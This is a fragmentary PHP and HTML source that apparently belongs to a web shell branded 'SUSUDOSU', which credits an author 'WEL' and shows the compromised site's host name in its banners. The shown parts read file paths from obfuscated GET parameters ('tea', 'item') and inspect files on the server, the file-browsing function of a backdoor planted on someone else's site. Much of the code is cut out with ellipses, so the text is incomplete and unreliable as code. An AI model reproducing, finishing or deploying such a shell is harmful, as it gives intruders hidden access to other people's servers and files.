...
<html>
    <head>
        ...
        <title>#SUSUDOSU- <?= $_SERVER['HTTP_HOST']; ?></title>
        ...
        <div class="container-fluid py-3 p-5 mt-3">
                ...
                <div class="modal fade" id="aboutThis" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" aria-labelledby="aboutThisLabel" aria-hidden="true">
                    <form action="" method="post" class="modal-dialog">
                        <div class="modal-content">
                            ...
                            <div class="modal-body">
                                <center>
                                    <span>SUSUDOSUfor <?= $_SERVER['HTTP_HOST']; ?> made by WEL.</span>
                                </center>
                            </div>
                            <div class="modal-footer">
                                ...
                                <div class="mb-3">
                                    <?php
                                        if (isset($_GET['tea']) && isset($_GET['item'])) {
                                            if ($_GET['tea'] === 'ef') {
                                                $item = acup($_GET['item']);if ($zzzz = getimagesize($cup . '/' . $item)) {
            ...
            <?php
                if (!is_readable($cup)) {
                    ...
                    echo '<span>~ SUSUDOSU- ' . $_SERVER['HTTP_HOST'] . '</span>';
                    echo '</div>';
                    echo '</center>';
                    exit();
                }
            ...
            <center>
                ...
                ?>
                <hr width='20%'>
                <span>~ SUSUDOSU- <?= $_SERVER['HTTP_HOST']; ?></span>
            </center>
        </div>
